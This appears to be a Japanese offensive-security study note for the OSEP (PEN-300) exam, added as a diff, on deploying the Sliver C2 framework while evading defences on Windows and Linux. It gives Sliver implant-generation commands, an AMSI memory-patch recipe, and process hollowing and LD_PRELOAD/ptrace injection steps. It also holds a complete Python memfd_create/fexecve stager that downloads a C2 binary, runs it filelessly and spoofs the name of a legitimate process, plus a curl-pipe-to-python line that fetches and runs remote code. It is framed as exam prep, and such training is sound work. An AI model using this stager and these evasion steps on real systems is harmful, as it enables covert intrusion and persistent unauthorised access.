@@ -1,0 +1,120 @@
+## win
+- OSEP（PEN-300）の環境を想定した場合、Sliverの標準機能である「.exe形式のインプラント生成」をそのままターゲットに送り込む方法は、アンチウイルス（AV）やEDRに高確率で検知されます。Go言語でビルドされたバイナリはシグネチャが特徴的な上、サイズが肥大化しやすいためです。
+  - OSEPの試験およびラボをSliverで攻略するための実践的なアプローチは、「シェルコード形式でのエクスポート」と「カスタムローダー（C#/C++）によるメモリ内展開・バイパスの組み合わせ」が基本形となります。
+- 具体的に効果的な4つのテクニックを解説します。
+1. フォームの変更：Raw EXEを捨ててシェルコードを使う
+  - Sliverではインプラントをシェルコード形式（.bin / .txt）で生成します。これにより、OSEP本編で自作するC#やC++のローダーへシームレスに組み込めるようになります。
+```Bash
+# mTLSまたはHTTP(S)リスナー用のシェルコードを生成
+generate --mtls <Kali_IP> --format shellcode --save /tmp/sliver.bin
+```
+2. メモリパッチによるAMSIバイパス (AmsiScanBuffer)
+- OSEPの序盤〜中盤で大きな壁となるのが、PowerShellや.NETアセンブリを実行する際に作動するAMSI（Antimalware Scan Interface）です。
+  - Sliverのセッションを確立した後にPowerShellなどの操作（backdoor コマンド等）を行う場合、またはC#ローダー内でインプラントを動かす前に、ターゲットプロセスのメモリ領域にある amsi.dll の AmsiScanBuffer 関数をパッチして無力化します。
+- 実践的なパッチの流れ（C#等のローダー側で実装）
+  - LoadLibrary("amsi.dll") でハンドルを取得。
+  - GetProcAddress("AmsiScanBuffer") で関数のアドレスを特定。
+  - VirtualProtect で該当領域を書き込み可能（PAGE_EXECUTE_READWRITE）に変更。
+  - 関数の先頭を「常に安全（AMSI_RESULT_CLEAN）」を返すアセンブリ命令（例: mov eax, 0x80070057; ret や xor eax, eax; ret）に書き換える。
+  - Sliverのビーコンがすでに立っている場合は、Sliverの拡張機能（Armory）からAMSIバイパス用のBOF（Beacon Object File）をロードしてインメモリで実行するアプローチも極めて有効です。
+3. プロセスホローイング（Process Hollowing）の活用
+- ディスク上にSliverのバイパイルを置かないために、OSEPで頻出するプロセスホローイングやプロセスの親プロセス偽装（PPID Spoofing）を組み合わせたローダーを用意します。
+  - svchost.exe や explorer.exe などの正規プロセスをサスペンド状態（CREATE_SUSPENDED）で起動。
+  - NtUnmapViewOfSection（またはAPIを使わない直接的なマッピング変更）で元のイメージをアンマップ。
+  - VirtualAllocEx と WriteProcessMemory を使い、先ほどSliverで生成したシェルコードをメモリに注入。
+  - ResumeThread で実行を開始。
+- この方法をとることで、AVの静的スキャンを完全に回避しつつ、タスクマネージャー上でも正規プロセスに偽装した状態でSliverのセッションを維持できます。
+
+4. execute-assembly による .NETツールのインメモリ実行
+- privilege escalation（権限昇格）やActive Directoryの列挙（SharpHoundやSeatbeltなど）を行う際、それらのツールをターゲットのディスクに保存すると即座にAVに捕まります。
+- Sliverにセッションが1本繋がっていれば、execute-assembly コマンドを使用してください。内部的にDonutの仕組みが走り、.NETのアセンブリ（EXE）をローカル（Kali側）から読み込んでターゲットプロセスのメモリ内で直接実行してくれます。ディスクに一切痕跡を残さないため、OSEPのラボでも極めて重宝するコマンドです。
+- 🔥 OSEP攻略のための推奨ワークフロー
+  - 初期侵入: OSEPの教材にあるC#ビルド（またはVBAマクロ）を使い、自作ローダー経由でSliverのシェルコードをメモリインジェクション。
+  - AMSI無効化: ローダー実行時、または初期シェル奪取直後にメモリパッチを充てる。
+  - ピボット構築: セッション確立後、sharphound などを execute-assembly で走らせてADの情報を抜く。さらに別セグメントへの足がかりとして Ligolo-ng を投入する。
+  - まずはローカルの検証環境（Windows Defenderが有効な環境）で、自作のC#コードにSliverのシェルコードを乗せて検知されるかどうか、どのAPIコールがフックされているかを1つずつ紐解いていくのが確実な一歩になります。
+
+## Linux
+- Linux環境をターゲットにする場合、Windowsとは完全に頭の切り替えが必要です。Windowsが「APIパッチ（AMSI/ETW）と.NETのインメモリ実行」の戦いだとしたら、Linuxは「ディスク（ファイルシステム）の監視回避、プロセスの偽装、共有ライブラリの操作」が主戦場になります。
+  - OSEPのシチュエーションを想定し、SliverをLinux環境で効果的に運用するための実践的なテクニックをまとめました。
+#### 1. memfd_create による完全ファイルレス実行
+- Linuxのセキュリティ監視（AuditdやEDRなど）は、/tmp などのディレクトリに不審なELFバイナリが配置されて実行されるケースを厳重に警戒しています。また、/tmp が noexec（実行不可）でマウントされている防御環境もOSEPでは珍しくありません。
+  - これを打破するのが memfd_create システムコールを使ったインメモリ実行です。
+  - 仕組み: RAM上に匿名ファイル（Anonymous File）を作成し、そこにSliverのELFインプラントを書き込んで直接実行します。ディスクには一切ファイルが書き込まれず、/proc/self/fd/ 経由で実行されるため、ディスク監視を完全にスルーできます。
+  - 実践方法: ターゲット上で動くPythonやPerlのワンライナー（スタージャー）を使い、KaliからSliverのELFをメモリ上に直接ダウンロードして memfd_create で叩きます。
+#### 2. .so（共有ライブラリ）形式での永続化と LD_PRELOAD
+- Linuxでは、Sliverを通常のELF（実行ファイル）ではなく、共有ライブラリ（.so）形式で生成して送り込むアプローチが非常に強力です。
+```Bash
+# Linux用の共有ライブラリ形式でインプラントを生成
+generate --mtls <Kali_IP> --os linux --format shared --save /tmp/sliver.so
+```
+  - 悪用テクニック：LD_PRELOAD ハィジャック
+  - 環境変数 LD_PRELOAD に自作の（またはSliverの）.so を指定すると、任意のコマンド（ls や cat など）が実行される直前にそのライブラリが強制的に読み込まれます。
+  - これを利用して、一般ユーザーが普段通りコマンドを打った瞬間に、バックグラウンドでSliverのセッションを子プロセスとして奪取するような永続化（Persistence）や権限昇格を狙います。
+#### 3. ptrace によるプロセスインジェクション
+- Windowsの CreateRemoteThread に相当するものが、Linuxでは ptrace システムコールです。
+  - すでに動作している正規のプロセス（例: apache2 や sshd、あるいは一般ユーザーの bash プロセス）にデバッガのようにアタッチし、そのプロセスのメモリ空間にSliverのシェルコードを注入して実行させます。
+  - メリット: 新しい不審なプロセスが立ち上がらないため、ps aux などのプロセスツリー監視で見破られにくくなります。
+
+#### Linux環境でのファイルレス実行を支える、Python 3の標準ライブラリ（os.memfd_create と os.fexecve）を使用した実用的なステージャーのコード例です。
+- この手法は、Python 3.8以降が導入されているモダンなLinux環境であれば、外部ライブラリを一切追加することなく動作します。
+```Python
+#!/usr/bin/env python3
+import os
+import urllib.request
+import sys
+
+def main():
+    # 1. C2サーバー（Kaliなど）のホストとポートを指定
+    # ※検証環境に合わせて変更してください
+    c2_url = "http://192.168.X.X:8080/sliver_linux.elf"
+    
+    print("[*] Downloading payload into memory...")
+    try:
+        # ディスクを介さず、メモリ上の変数（bytes）に直接格納
+        with urllib.request.urlopen(c2_url) as response:
+            payload = response.read()
+    except Exception as e:
+        print(f"[-] Download failed: {e}")
+        sys.exit(1)
+
+    print("[*] Creating anonymous memory file...")
+    # 2. memfd_createでメモリ内に匿名ファイル（ファイル記述子）を作成
+    # 引数の文字列は/proc/self/fd/ 内に表示される名前（監査ログを意識して偽装可能）
+    # MFD_CLOEXEC (1) を指定して、子プロセスに不要なFDを引き継がないようにする
+    try:
+        fd = os.memfd_create("systemd-service", flags=os.MFD_CLOEXEC)
+    except AttributeError:
+        print("[-] os.memfd_create is not supported on this Python/OS version.")
+        sys.exit(1)
+
+    # 3. メモリ内のファイル記述子にC2バイナリのデータを書き込む
+    os.write(fd, payload)
+
+    # 4. プロセス偽装（argv[0]の書き換え）
+    # ps aux コマンドなどで表示されるプロセス名を正規のもの（例: apache2）に見せかける
+    fake_process_name = "/usr/sbin/apache2"
+    argv = [fake_process_name]
+    env = os.environ
+
+    print("[+] Executing payload via fexecve...")
+    # 5. fexecveを実行して、現在のPythonプロセスをメモリ上のC2バイナリで上書き
+    # ディスク上のパスではなく、ファイル記述子(fd)から直接実行するため完全ファイルレス
+    try:
+        os.fexecve(fd, argv, env)
+    except Exception as e:
+        print(f"[-] Execution failed: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+```    
+- OSEP視点での解説とテクニック
+  - ① os.fexecve の強力さ
+    - 通常の os.system() や subprocess は、ディスク上の実行ファイル（/bin/sh など）のパスを要求します。しかし os.fexecve(fd, ...) は、カーネルが管理するファイル記述子（メモリ上のバッファ）を直接実行できるため、ディスクに一時ファイル（/tmp/payload など）を書き込む必要が一切ありません。
+  - ② プロセス名偽装（引数 argv）
+    - 上記のコードで argv = ["/usr/sbin/apache2"] としている部分がポイントです。
+    - Linuxでは、プロセスが起動した後の ps aux や top コマンドの出力は、argv[0] に渡された文字列を参照します。そのため、Sliverのインプラントであっても、管理者がパッと見しただけでは「Webサーバーの正規プロセスが動いている」ように誤認させることができます。
+  - ③ ターゲットのPythonが古い場合（Python 2.xや3.7以下）
+    - もしOSEPのラボ環境で古いLinuxが使われており、os.memfd_create が存在しない場合は、ctypes モジュールを使って直接 libc.so.6 のシステムコール番号（sys_memfd_create）を叩く形式に書き換えることで同様のロジックが再現可能です。
+    - このスクリプトをKali側で適当なWebサーバー（python3 -m http.server 8080）に配置し、ターゲット側で curl や wget を使ってパイプ（curl http://.../stager.py | python3）で実行すれば、最初から最後までディスクに触れずにSliverのセッションを確立できます。
